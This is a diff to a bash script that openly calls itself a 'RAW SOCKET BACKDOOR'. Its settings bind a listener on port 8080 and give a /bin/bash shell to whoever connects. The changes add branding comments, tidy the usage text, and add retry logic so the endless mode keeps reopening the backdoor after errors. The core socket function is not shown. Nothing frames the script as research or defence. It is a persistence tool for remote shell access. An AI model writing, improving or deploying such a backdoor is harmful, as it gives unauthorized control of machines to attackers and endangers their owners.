@@ -1,4 +1,8 @@
 #!/bin/bash
+#
+# Regards, the Alveare Solutions society.
+#
+# RAW SOCKET BACKDOOR
 
 RUNNING_MODE='single' # (single | limited | endless)
 CONNECTION_LIMIT=3
@@ -7,8 +11,6 @@ PORT_NUMBER=8080
 VERBOSITY=0           # (0 | 1 | 2 | 3)
 LOG_FILE=''           # /path/to/file.log
 SHELL_PATH='/bin/bash'
-
-# FETCHERS
 
 # SETTERS
 
@@ -218,11 +220,12 @@ function display_banner () {
 
 function display_usage () {
     display_header
+    local SCRIPT_NAME=`basename $0`
     cat<<EOF
 
     [ DESCRIPTION ]: Backdoor.
 
-    [ USAGE ]: $0 -<option>=<value>
+    [ USAGE ]: $SCRIPT_NAME -<option>=<value>
 
     -h  | --help                Display this message.
     -v  | --verbose             Raise verbosity level. Can be used up to 3 times.
@@ -237,7 +240,7 @@ function display_usage () {
     -s= | --shell=              Specifies shell to execute upon incomming
                                 connection. Defaults to (/bin/bash).
 
-    [ EXAMPLE ]: $0
+    [ EXAMPLE ]: $SCRIPT_NAME
 
     (-v | --verbose             )
     (-f | --foreground          )
@@ -303,6 +306,10 @@ function raw_backdoor_endless_mode () {
     do
         log_msg "INFO" "Opening raw socket backdoor ($COUNT)."
         raw_backdoor $PORT_NUMBER "$SHELL_PATH" $VERBOSITY
+        if [ $? -ne 0 ]; then
+            sleep 2
+            continue
+        fi
         COUNT=$((COUNT + 1))
     done
     return 0
